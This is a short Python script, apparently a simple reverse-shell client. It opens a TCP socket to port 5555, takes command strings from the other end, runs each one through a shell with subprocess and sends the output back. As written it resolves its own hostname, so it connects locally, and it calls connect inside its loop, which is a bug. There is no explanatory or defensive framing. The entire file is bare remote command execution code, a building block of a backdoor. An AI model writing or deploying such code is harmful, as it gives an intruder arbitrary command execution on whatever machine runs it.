import socket,subprocess

# STATIC VARIABLES
PORT = 5555
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER,PORT)

client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

while True:
    client_socket.connect(ADDR)
    comman = client_socket.recv(4096).decode('utf-8')
    output = subprocess.check_output(comman, shell=True)
    client_socket.sendall(output)